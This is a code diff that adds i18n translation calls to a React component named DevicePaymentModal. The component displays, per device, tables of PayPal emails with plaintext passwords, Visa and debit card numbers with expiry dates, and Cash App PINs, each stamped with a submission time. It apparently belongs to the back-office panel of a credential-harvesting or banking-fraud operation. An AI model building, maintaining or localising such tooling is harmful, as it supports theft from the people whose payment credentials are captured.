@@ -14,6 +14,8 @@ import type {
 } from "../types";
 import { formatDateTime } from "../utils/format";
 import "../styles/device-payment-modal.css";
+import { useI18n, t } from "../i18n";
+
 
 interface DevicePaymentModalProps {
   open: boolean;
@@ -28,6 +30,7 @@ export function DevicePaymentModal({
   deviceLabel,
   onClose,
 }: DevicePaymentModalProps) {
+  useI18n();
   const [activeTab, setActiveTab] = useState("paypal");
   const [loading, setLoading] = useState(false);
   const [errorText, setErrorText] = useState<string | null>(null);
@@ -85,7 +88,7 @@ export function DevicePaymentModal({
 
   return (
     <Modal
-      title={deviceLabel ? `支付账号 - ${deviceLabel}` : "支付账号"}
+      title={deviceLabel ? t("支付账号 - {0}", { 0: deviceLabel }) : t("支付账号")}
       open={open}
       onCancel={onClose}
       footer={null}
@@ -105,31 +108,31 @@ export function DevicePaymentModal({
             children: (
               <PaymentTable
                 loading={loading}
-                emptyText="暂无 PayPal 账号记录"
+                emptyText={t("暂无 PayPal 账号记录")}
                 columns={[
                   {
                     key: "email",
-                    title: "邮箱",
+                    title: t("邮箱"),
                     getValue: (row) => (row as PayPalAccountRecord).email,
                   },
                   {
                     key: "password",
-                    title: "密码",
+                    title: t("密码"),
                     getValue: (row) => (row as PayPalAccountRecord).password,
                   },
                   {
                     key: "amount",
-                    title: "金额",
+                    title: t("金额"),
                     getValue: (row) => (row as PayPalAccountRecord).amount ?? "-",
                   },
                   {
                     key: "currency",
-                    title: "币种",
+                    title: t("币种"),
                     getValue: (row) => (row as PayPalAccountRecord).currency,
                   },
                   {
                     key: "submittedAt",
-                    title: "提交时间",
+                    title: t("提交时间"),
                     getValue: (row) => formatDateTime((row as PayPalAccountRecord).submittedAt),
                   },
                 ]}
@@ -143,21 +146,21 @@ export function DevicePaymentModal({
             children: (
               <PaymentTable
                 loading={loading}
-                emptyText="暂无 Visa 卡记录"
+                emptyText={t("暂无 Visa 卡记录")}
                 columns={[
                   {
                     key: "cardHolder",
-                    title: "持卡人",
+                    title: t("持卡人"),
                     getValue: (row) => (row as VisaAccountRecord).cardHolder,
                   },
                   {
                     key: "cardNumber",
-                    title: "卡号",
+                    title: t("卡号"),
                     getValue: (row) => (row as VisaAccountRecord).cardNumber,
                   },
                   {
                     key: "expiry",
-                    title: "有效期",
+                    title: t("有效期"),
                     getValue: (row) => (row as VisaAccountRecord).expiry,
                   },
                   {
@@ -167,12 +170,12 @@ export function DevicePaymentModal({
                   },
                   {
                     key: "amount",
-                    title: "金额",
+                    title: t("金额"),
                     getValue: (row) => (row as VisaAccountRecord).amount ?? "-",
                   },
                   {
                     key: "submittedAt",
-                    title: "提交时间",
+                    title: t("提交时间"),
                     getValue: (row) => formatDateTime((row as VisaAccountRecord).submittedAt),
                   },
                 ]}
@@ -186,7 +189,7 @@ export function DevicePaymentModal({
             children: (
               <PaymentTable
                 loading={loading}
-                emptyText="暂无 Cash App 记录"
+                emptyText={t("暂无 Cash App 记录")}
                 columns={[
                   {
                     key: "pin",
@@ -195,12 +198,12 @@ export function DevicePaymentModal({
                   },
                   {
                     key: "amount",
-                    title: "金额",
+                    title: t("金额"),
                     getValue: (row) => (row as CashAppAccountRecord).amount ?? "-",
                   },
                   {
                     key: "submittedAt",
-                    title: "提交时间",
+                    title: t("提交时间"),
                     getValue: (row) => formatDateTime((row as CashAppAccountRecord).submittedAt),
                   },
                 ]}
@@ -210,25 +213,25 @@ export function DevicePaymentModal({
           },
           {
             key: "debit",
-            label: `储蓄卡 (${debitAccounts.length})`,
+            label: t("储蓄卡 ({0})", { 0: debitAccounts.length }),
             children: (
               <PaymentTable
                 loading={loading}
-                emptyText="暂无储蓄卡记录"
+                emptyText={t("暂无储蓄卡记录")}
                 columns={[
                   {
                     key: "cardHolder",
-                    title: "持卡人",
+                    title: t("持卡人"),
                     getValue: (row) => (row as DebitAccountRecord).cardHolder,
                   },
                   {
                     key: "cardNumber",
-                    title: "卡号",
+                    title: t("卡号"),
                     getValue: (row) => (row as DebitAccountRecord).cardNumber,
                   },
                   {
                     key: "expiry",
-                    title: "有效期",
+                    title: t("有效期"),
                     getValue: (row) => (row as DebitAccountRecord).expiry,
                   },
                   {
@@ -243,12 +246,12 @@ export function DevicePaymentModal({
                   },
                   {
                     key: "amount",
-                    title: "金额",
+                    title: t("金额"),
                     getValue: (row) => (row as DebitAccountRecord).amount ?? "-",
                   },
                   {
                     key: "submittedAt",
-                    title: "提交时间",
+                    title: t("提交时间"),
                     getValue: (row) => formatDateTime((row as DebitAccountRecord).submittedAt),
                   },
                 ]}
@@ -285,8 +288,9 @@ function PaymentTable({
   columns,
   rows,
 }: PaymentTableProps) {
+  useI18n();
   if (loading) {
-    return <div className="device-payment-empty">加载中…</div>;
+    return <div className="device-payment-empty">{t("加载中…")}</div>;
   }
 
   if (rows.length === 0) {
@@ -298,7 +302,7 @@ function PaymentTable({
       <table className="device-payment-table">
         <thead>
           <tr>
-            <th>序号</th>
+            <th>{t("序号")}</th>
             {columns.map((column) => (
               <th key={column.key}>{column.title}</th>
             ))}
